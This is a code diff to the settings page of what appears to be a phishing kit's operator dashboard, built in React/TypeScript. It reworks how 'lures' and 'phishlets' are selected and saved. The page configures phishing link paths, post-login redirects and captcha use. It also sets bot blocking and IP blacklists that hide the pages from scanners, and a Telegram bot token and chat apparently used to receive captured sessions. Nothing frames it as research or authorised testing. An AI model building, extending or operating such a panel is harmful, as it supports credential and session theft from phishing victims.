@@ -138,6 +138,34 @@ export default function Settings() {
             );
             if (savedLure) {
               lureToSelect = savedLure;
+
+              // Fetch the specific lure's full configuration
+              try {
+                const lureConfigResponse = await fetch(
+                  `/api/full-link?lureId=${savedLureId}`
+                );
+                if (lureConfigResponse.ok) {
+                  const lureConfig = await lureConfigResponse.json();
+
+                  // Update link data with the lure-specific configuration
+                  linkData.afterLoginRedirect =
+                    lureToSelect.redirect_url || linkData.afterLoginRedirect;
+                  linkData.useCaptcha = lureToSelect.redirector === "main";
+
+                  // If we have a path in lureConfig, use it
+                  if (lureConfig.path) {
+                    linkData.linkPath = lureConfig.path;
+                  } else {
+                    // Otherwise use the path from the lure
+                    const cleanPath = lureToSelect.path.startsWith("/")
+                      ? lureToSelect.path.substring(1)
+                      : lureToSelect.path;
+                    linkData.linkPath = cleanPath;
+                  }
+                }
+              } catch (error) {
+                console.error("Error fetching lure configuration:", error);
+              }
             }
           }
 
@@ -157,35 +185,10 @@ export default function Settings() {
           // Set the selected lure
           if (lureToSelect) {
             setSelectedLure(lureToSelect);
-
-            // Update form fields with the selected lure values
-            const cleanPath = lureToSelect.path.startsWith("/")
-              ? lureToSelect.path.substring(1)
-              : lureToSelect.path;
-
-            // Update our local copy of link data before setting state
-            const updatedLinkPath = cleanPath;
-            const updatedRedirect =
-              lureToSelect.redirect_url || linkData.afterLoginRedirect;
-
-            // Then use these values when setting state
-            setSettings((prev) => ({
-              ...prev,
-              telegramToken: telegramData.bot_token || "",
-              telegramChatId: telegramData.chat_id || "",
-              blockBots: securityData.blockBots,
-              botRedirectLink: securityData.redirectUrl || "",
-              afterLoginRedirect: updatedRedirect,
-              useCaptcha: linkData.useCaptcha,
-              linkPath: updatedLinkPath,
-              blacklistedIPs: blacklistData.ips || [],
-            }));
-
-            return; // Exit early as we've already set the state
           }
         }
 
-        // Default state setting if no lure was selected
+        // Set the settings with the data we have
         setSettings((prev) => ({
           ...prev,
           telegramToken: telegramData.bot_token || "",
@@ -206,6 +209,85 @@ export default function Settings() {
     };
     fetchSettings();
   }, []);
+
+  // Enhance the lureChanged event listener to update all form fields completely
+  useEffect(() => {
+    const handleLureChangedEvent = async (event: CustomEvent) => {
+      if (event.detail) {
+        const { lureId } = event.detail;
+        if (!lureId) return;
+
+        // Find the lure with this ID
+        const selected = lures.find((lure) => lure.id === lureId);
+        if (!selected) return;
+
+        // Update the selected lure
+        setSelectedLure(selected);
+
+        try {
+          // Fetch the full configuration for this lure to get all settings
+          const lureConfigResponse = await fetch(
+            `/api/full-link?lureId=${lureId}`
+          );
+          if (lureConfigResponse.ok) {
+            const lureConfig = await lureConfigResponse.json();
+
+            // Update all settings related to this lure
+            setSettings((prev) => {
+              // Determine the clean path
+              const cleanPath = selected.path.startsWith("/")
+                ? selected.path.substring(1)
+                : selected.path;
+
+              return {
+                ...prev,
+                linkPath: lureConfig.path || cleanPath,
+                afterLoginRedirect:
+                  selected.redirect_url || prev.afterLoginRedirect,
+                useCaptcha: selected.redirector === "main",
+              };
+            });
+
+            // Display a notification that settings form has been updated
+            toast.success(
+              `Form updated to reflect "${selected.phishlet} - ${selected.path}" settings`
+            );
+          }
+        } catch (error) {
+          console.error("Error fetching lure configuration:", error);
+
+          // If API call fails, still update with basic information
+          const cleanPath = selected.path.startsWith("/")
+            ? selected.path.substring(1)
+            : selected.path;
+
+          setSettings((prev) => ({
+            ...prev,
+            linkPath: cleanPath,
+            afterLoginRedirect:
+              selected.redirect_url || prev.afterLoginRedirect,
+            useCaptcha: selected.redirector === "main",
+          }));
+
+          toast.error("Partially updated form with available lure settings");
+        }
+      }
+    };
+
+    // Add the event listener
+    window.addEventListener(
+      "lureChanged",
+      handleLureChangedEvent as EventListener
+    );
+
+    // Remove the event listener on cleanup
+    return () => {
+      window.removeEventListener(
+        "lureChanged",
+        handleLureChangedEvent as EventListener
+      );
+    };
+  }, [lures]);
 
   const handleTelegramSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -280,14 +362,24 @@ export default function Settings() {
     e.preventDefault();
     try {
       setSaving(true);
+
+      // Prepare the request body
+      const requestBody = {
+        afterLoginRedirect: settings.afterLoginRedirect,
+        useCaptcha: settings.useCaptcha,
+        linkPath: settings.linkPath,
+      };
+
+      // If we have a selected lure, include its ID
+      if (selectedLure) {
+        // @ts-ignore - Add lureId to the request if we have a selected lure
+        requestBody.lureId = selectedLure.id;
+      }
+
       const response = await fetch("/api/link-settings", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          afterLoginRedirect: settings.afterLoginRedirect,
-          useCaptcha: settings.useCaptcha,
-          linkPath: settings.linkPath,
-        }),
+        body: JSON.stringify(requestBody),
       });
 
       if (!response.ok) {
@@ -299,8 +391,18 @@ export default function Settings() {
         method: "POST",
       });
 
+      // Update the localStorage with the selected lure ID if applicable
+      if (selectedLure) {
+        localStorage.setItem("selectedLureId", selectedLure.id);
+      }
+
       // Emit a custom event that the index page can listen to
-      const event = new CustomEvent("linkSettingsUpdated");
+      const event = new CustomEvent("linkSettingsUpdated", {
+        detail: {
+          lureId: selectedLure?.id,
+          settings: requestBody,
+        },
+      });
       window.dispatchEvent(event);
 
       setShowSuccess(true);
@@ -482,54 +584,6 @@ export default function Settings() {
     } finally {
       setSaving(false);
     }
-  };
-
-  const handleLureChange = (lureId: string) => {
-    // If "Select link" option is chosen, clear the selected lure
-    if (lureId === "-1") {
-      setSelectedLure(null);
-      localStorage.removeItem("selectedLureId");
-
-      // Reset the form fields
-      setSettings((prev) => ({
-        ...prev,
-        linkPath: "",
-        afterLoginRedirect: "",
-      }));
-
-      return;
-    }
-
-    const selectedLureIndex = lures.findIndex((lure) => lure.id === lureId);
-    if (selectedLureIndex === -1) return;
-
-    const selected = lures[selectedLureIndex];
-    setSelectedLure(selected);
-
-    // Save the selected lure ID to localStorage
-    localStorage.setItem("selectedLureId", selected.id);
-
-    // Update the link path input with the selected lure's path
-    const cleanPath = selected.path.startsWith("/")
-      ? selected.path.substring(1)
-      : selected.path;
-
-    // Update all related settings
-    setSettings((prev) => ({
-      ...prev,
-      linkPath: cleanPath,
-      afterLoginRedirect: selected.redirect_url || prev.afterLoginRedirect,
-    }));
-
-    // Also update the fullLink in the dashboard in real-time
-    // This is done by dispatching an event that the index page listens to
-    const event = new CustomEvent("lureChanged", {
-      detail: {
-        lureId: selected.id,
-        lureIndex: selectedLureIndex,
-      },
-    });
-    window.dispatchEvent(event);
   };
 
   const filteredSessions = sessions.filter((session) => {
@@ -725,24 +779,6 @@ export default function Settings() {
             </div>
 
             <div>
-              <label className="block text-gray-400 mb-2">Link Type</label>
-              {lures.length > 0 ? (
-                <select
-                  className="w-full bg-[#1B2028] text-white p-3 rounded mb-4"
-                  value={selectedLure?.id || "-1"}
-                  onChange={(e) => handleLureChange(e.target.value)}
-                >
-                  <option value="-1">Select link</option>
-                  {lures.map((lure) => (
-                    <option key={lure.id} value={lure.id}>
-                      {lure.phishlet} - {lure.path}
-                    </option>
-                  ))}
-                </select>
-              ) : (
-                <p className="text-sm text-gray-500 mb-4">No lures available</p>
-              )}
-
               <label className="block text-gray-400 mb-2">Link Path</label>
               <input
                 type="text"
@@ -760,6 +796,12 @@ export default function Settings() {
               <p className="text-xs text-gray-500 mt-1">
                 The path will always start with "/" in the system
               </p>
+              {selectedLure && (
+                <p className="text-xs text-indigo-400 mt-1">
+                  Currently editing: {selectedLure.phishlet} -{" "}
+                  {selectedLure.path}
+                </p>
+              )}
             </div>
 
             <button
